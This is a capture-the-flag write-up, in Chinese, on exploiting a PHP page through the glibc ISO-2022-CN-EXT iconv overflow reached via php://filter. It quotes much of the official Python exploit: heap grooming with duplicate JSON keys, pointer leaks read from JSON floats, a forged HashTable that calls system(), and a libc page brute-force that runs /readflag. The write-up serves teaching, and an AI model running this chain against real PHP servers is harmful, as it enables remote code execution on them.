# definitely-not-a-web-chal

## 题目简述

题目只暴露了一个极短的 PHP 页面：

```php
<?php

$user_submit = json_decode($_POST['submit'], true);

$user_submit[$_POST['key']] = md5_file($_POST['file']);

echo '<div id="result">'.json_encode($user_submit).'</div>';
```

攻击者可以控制 `md5_file()` 的文件名，因此可以传入 `php://filter` 包装器。容器保留了存在越界写问题的 `ISO-2022-CN-EXT` gconv 模块，并将 PHP 固定在指定提交上；服务还额外应用了堆隔离和敏感元数据只读补丁。题目要求在这些加固条件下，利用字符集转换过程中的原生内存破坏，最终调用 setuid 程序 `/readflag`。

虽然入口是 HTTP 和 PHP，但决定性障碍不是 Web 业务逻辑，而是 PHP/glibc 原生堆利用，因此归入 Pwn。

## 解题过程

### 1. 从 `md5_file()` 进入易受攻击的 iconv 路径

`md5_file()` 会真正读取传入的流。构造如下资源名后，PHP 会先解码内联 Base64 数据，再执行从 UTF-8 到 ISO-2022-CN-EXT 的字符集转换：

```python
exp = "OVERFLOW".ljust(0x2000 - 3, "A") + "劄"
exp = base64.b64encode(exp.encode()).decode()
file_resource = (
    "php://filter/"
    "convert.iconv.UTF-8.ISO-2022-CN-EXT/"
    f"resource=data:text/plain;base64,{exp}"
)
```

末尾汉字会让转换器输出特定转义序列；当输出缓冲区恰好位于边界时，转换器会越过缓冲区末端写入少量字节。单次覆盖很短，所以不能直接布置完整指针，必须先精确控制相邻 PHP 堆对象。

### 2. 利用 JSON 对象完成堆布局

请求中的 `submit` 会被 `json_decode(..., true)` 转成 PHP 数组。官方脚本批量创建不同尺寸的字符串和哈希表，使相应分配进入预期槽位。一个关键技巧是先在 Python 字典中创建名字不同、发送前却会变成同名的键：

```python
def make_payload(file_resource, submit):
    return [
        ("file", file_resource),
        ("key", CHALLENGE_KEY),
        ("submit", json.dumps(submit).replace("_REPLACE", "")),
    ]
```

例如：

```python
submit["freed_bucket"] = freed_bucket
submit["freed_bucket_REPLACE"] = ""
```

Python 侧两个键可以同时存在；删除 `_REPLACE` 后，两者在 JSON 中重名。PHP 解码后，后一个值替换前一个值，前一个复杂对象随即释放。这样既能让较大的 Bucket/HashTable 先完成分配，又能在同一次解析过程中制造可重用的空洞。

官方脚本中的 `clear()` 和 `set_val()` 也是同一思路：通过不断增加 `_REPLACE` 后缀，在最终 JSON 中反复覆盖指定键，控制对象的释放与重新占用。

### 3. 将短越界写放大为类型混淆

堆风水的目标，是让 iconv 输出缓冲区与待攻击的 Zend 对象相邻。越界写修改对象长度或类型相关字段后，原本的数组元素可被当成另一种 `zval` 解释。

官方解法分两次调用 `pwn_leak()`：

```python
def do_leak(leak_type="zend"):
    res = pwn_leak(leak_type)
    res = parse_html(res)
    leak = res["real_array"]["R96"]
    leak = struct.unpack("<Q", struct.pack("<d", leak))[0]
    return leak
```

被破坏的值经 `json_encode()` 输出为 JSON 浮点数。脚本再把该浮点数按 IEEE-754 双精度的原始位模式重新解释为 64 位整数，从而恢复指针。

两类泄漏分别用于获得：

- PHP-FPM 堆附近的地址；
- Zend 主堆中、与 libc 映射关系稳定的地址。

第二个泄漏按 2 MiB 对齐：

```python
zend_heap_main_chunk &= 0xffffffe00000
```

这为后续定位命令字符串和枚举 `system()` 所在页面提供了基准。

### 4. 伪造对象，把函数指针和参数送入可调用位置

写阶段重新布置堆，并让被覆盖的 HashTable 指向攻击者控制的数组。参考脚本在 `fake_ht` 中放入伪造字段：

```python
fake_ht = [i for i in range(300 - 1)]
fake_ht[0x01] = 0x0000000700000001
fake_ht[0x02] = arg0
fake_ht[0x04] = pc
fake_ht[0x05] = [[0x1337]]
submit["real_array"] = fake_ht
```

其中：

- `arg0` 指向请求中保存的命令字符串；
- `pc` 是待尝试的 `system()` 地址；
- 其余字段让伪造结构在 Zend 后续处理期间进入间接调用路径。

默认命令为：

```text
/readflag>1.php; #
```

`/readflag` 具有 setuid 权限，可以读取仅 root 可读的 `/flag`；输出被重定向到 Web 根目录下的 `1.php`。尾部注释符会吞掉相邻的非预期字节。

### 5. 在已知相对范围内探测 `system()`

参考环境中，攻击者可控命令位于对齐后的 Zend 主堆基址加固定偏移 `0x8b018`。libc 位于相邻范围，但低位映射仍需枚举。官方脚本先向前搜索 0x300 页，再向后搜索 0x80 页：

```python
def probe_offsets():
    yield from range(0, 0x300)
    yield from range(-1, -0x81, -1)
```

完整触发逻辑为：

```python
near_fpm = do_leak("heap")
zend_heap_main_chunk = do_leak("zend")

zend_heap_main_chunk &= 0xffffffe00000
exp_str = zend_heap_main_chunk + 0x8b018
near_libc = zend_heap_main_chunk + 0x200000

for i in probe_offsets():
    candidate = near_libc + 0x1000 * i + 0x2fdcd70
    pwn_write(exp_str, candidate)
    try:
        res = requests.get(URL + "1.php", timeout=5)
    except requests.exceptions.RequestException:
        continue
    if res.status_code == 200 and res.text.strip():
        print(res.text.strip())
        break
else:
    raise SystemExit(1)
```

`0x2fdcd70` 是参考环境下从被枚举页面基准到目标调用位置的偏移，不应直接套用于其他 PHP、glibc 或容器版本。每次尝试后读取 `/1.php`：只有成功调用 `system()` 并执行 `/readflag` 时，该文件才会出现且包含 flag。

运行官方脚本时可通过环境变量传入目标地址和题目键：

```bash
URL='http://challenge-host/' KEY='Up9}' python3 solve.py
```

该脚本依赖 `requests`、`tqdm` 和 pwntools。

## 方法总结

本题的利用链是：

1. 通过 `md5_file()` 打开 `php://filter`，进入 ISO-2022-CN-EXT 转换器；
2. 用特制字符在输出边界触发短越界写；
3. 借助 JSON 重名键制造释放与重占用，绕过题目增加的堆隔离；
4. 破坏 Zend 对象并将指针伪装成 JSON 浮点数，泄漏堆和 Zend 地址；
5. 伪造可调用对象，以命令地址作为参数、以候选 `system()` 地址作为程序计数器；
6. 按页探测 libc 地址，执行 `/readflag>1.php`，再通过 HTTP 读取结果。

题目的关键不在页面本身，而在“流包装器能够把一个普通文件操作引到原生字符集转换器”这一跨层攻击面。加固补丁提高了堆布局和元数据篡改的难度，但没有消除底层短越界写，也没有阻断由普通 Zend 对象构造出的泄漏与间接调用原语。
